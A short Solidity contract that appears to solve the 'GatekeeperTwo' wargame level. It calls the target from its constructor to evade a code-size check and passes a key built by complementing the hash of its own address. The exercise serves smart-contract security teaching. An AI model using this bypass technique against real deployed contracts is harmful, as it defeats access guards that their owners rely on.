// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeperTwo.sol"; 

contract GatekeeperTwoSolution {

    GatekeeperTwo private gatekeeperTwo;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;
        gatekeeperTwo.enter(bytes8(craftKey(address(this))));
    }


    function craftKey(address sender) public view returns (uint64 key) {
        return ~uint64(bytes8(keccak256(abi.encodePacked(sender))));
    }
}